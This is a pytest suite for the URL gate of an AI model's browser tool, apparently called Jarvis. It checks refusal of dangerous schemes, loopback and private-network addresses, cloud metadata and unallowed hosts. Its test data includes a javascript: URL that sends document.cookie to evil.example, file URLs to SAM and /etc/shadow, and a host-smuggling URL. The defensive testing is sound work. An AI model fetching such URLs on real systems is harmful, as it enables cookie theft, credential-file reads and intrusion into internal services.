"""URL gating. The browser's equivalent of the path jail.

Every test here is an attempt to get Jarvis to fetch something it should not:
a local file, a service on this machine, a device on the LAN, or a host the
user never allowed. A page Jarvis reads can contain instructions aimed at the
model, so this is the boundary that decides whether those instructions can
reach anything.
"""

from __future__ import annotations

import pytest

from jarvis.browser.session import BrowserSettings, NavigationRefused, check_url


def settings(**kw: object) -> BrowserSettings:
    base: dict[str, object] = {"allowed_hosts": {"example.com"}}
    base.update(kw)
    return BrowserSettings(**base)  # type: ignore[arg-type]


# ── schemes ──────────────────────────────────────────────────────────────
@pytest.mark.parametrize(
    "url",
    [
        "file:///C:/Windows/System32/config/SAM",
        "file:///etc/shadow",
        "FILE:///etc/passwd",
        "javascript:alert(1)",
        "JavaScript:fetch('http://evil.example/'+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "blob:https://example.com/abc",
        "about:config",
        "chrome://settings",
        "chrome-extension://abc/page.html",
        "view-source:https://example.com",
    ],
)
def test_dangerous_schemes_are_refused(url: str) -> None:
    with pytest.raises(NavigationRefused):
        check_url(url, settings())


def test_file_scheme_explains_the_real_reason() -> None:
    """The refusal must name the path jail, not just say "no"."""
    with pytest.raises(NavigationRefused) as exc:
        check_url("file:///etc/passwd", settings())
    assert "folder permissions" in exc.value.message


def test_javascript_is_judged_as_a_scheme_not_a_host() -> None:
    """Regression: the bare-domain helper used to prepend https:// to this.

    That turned a scheme check into a host check and produced a refusal about
    allowlists for what is actually code execution in the page.
    """
    with pytest.raises(NavigationRefused) as exc:
        check_url("javascript:alert(1)", settings())
    assert "javascript" in exc.value.message.lower()
    assert "execute code" in exc.value.message


@pytest.mark.parametrize("url", ["ftp://example.com/x", "ws://example.com", "mailto:a@b.c"])
def test_only_http_and_https(url: str) -> None:
    with pytest.raises(NavigationRefused):
        check_url(url, settings())


# ── this machine and the local network ───────────────────────────────────
@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:8080/",
        "http://127.0.0.1/",
        "http://127.1.2.3/",
        "https://[::1]:443/",
        "http://0.0.0.0:9/",
        "http://localhost.localdomain/",
    ],
)
def test_loopback_is_refused_by_default(url: str) -> None:
    with pytest.raises(NavigationRefused) as exc:
        check_url(url, settings())
    assert "on this machine" in exc.value.message


def test_loopback_allowed_only_when_switched_on() -> None:
    assert check_url("http://127.0.0.1:3000/app", settings(allow_loopback=True)) == (
        "http://127.0.0.1:3000/app"
    )


def test_loopback_does_not_need_allowlisting_as_well() -> None:
    """The host allowlist governs sites on the internet, not this machine."""
    url = check_url("http://localhost:5173/", settings(allowed_hosts=set(), allow_loopback=True))
    assert url == "http://localhost:5173/"


@pytest.mark.parametrize(
    "url",
    [
        "http://192.168.1.1/",
        "http://10.0.0.5/admin",
        "http://172.16.4.9/",
        "http://172.31.255.255/",
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://100.100.100.100/",
        "http://printer.local/",
        "http://wiki.internal/",
        "http://nas.lan/",
    ],
)
def test_private_network_is_always_refused(url: str) -> None:
    with pytest.raises(NavigationRefused) as exc:
        check_url(url, settings(allow_any_host=True, allow_loopback=True))
    assert "local network" in exc.value.message


def test_public_addresses_that_merely_look_private_are_fine() -> None:
    """172.32 and 11.x are public; an over-broad prefix check would refuse them."""
    for host in ("172.32.0.1", "11.0.0.1", "192.167.1.1", "100.63.0.1"):
        assert check_url(f"http://{host}/", settings(allow_any_host=True))


# ── the host allowlist ───────────────────────────────────────────────────
def test_allowed_host_passes() -> None:
    assert check_url("https://example.com/page", settings()) == "https://example.com/page"


def test_subdomain_of_an_allowed_host_passes() -> None:
    assert check_url("https://docs.example.com/x", settings())


def test_unallowed_host_is_refused_and_says_what_is_allowed() -> None:
    with pytest.raises(NavigationRefused) as exc:
        check_url("https://evil.test/steal", settings())
    assert "evil.test" in exc.value.message
    assert "example.com" in exc.value.message


def test_a_host_merely_ending_in_the_allowed_name_is_refused() -> None:
    """notexample.com must not pass because it ends with "example.com"."""
    with pytest.raises(NavigationRefused):
        check_url("https://notexample.com/", settings())


def test_allow_any_host_removes_the_allowlist() -> None:
    assert check_url("https://anything.test/", settings(allow_any_host=True))


def test_empty_allowlist_refuses_everything_and_says_so() -> None:
    with pytest.raises(NavigationRefused) as exc:
        check_url("https://example.com/", settings(allowed_hosts=set()))
    assert "none yet" in exc.value.message


# ── shapes ───────────────────────────────────────────────────────────────
def test_bare_domain_gets_https() -> None:
    assert check_url("example.com", settings()) == "https://example.com"


def test_bare_domain_with_path() -> None:
    assert check_url("example.com/a/b?c=d", settings()) == "https://example.com/a/b?c=d"


@pytest.mark.parametrize("url", ["", "   ", "https://", "http:///path"])
def test_unusable_addresses_are_refused(url: str) -> None:
    with pytest.raises(NavigationRefused):
        check_url(url, settings())


def test_credentials_in_the_url_do_not_smuggle_a_host() -> None:
    """ "https://example.com@evil.test/" has host evil.test, not example.com."""
    with pytest.raises(NavigationRefused):
        check_url("https://example.com@evil.test/", settings())


def test_port_does_not_defeat_the_allowlist() -> None:
    assert check_url("https://example.com:8443/x", settings())


def test_case_in_the_host_is_normalised() -> None:
    assert check_url("https://EXAMPLE.COM/Path", settings())
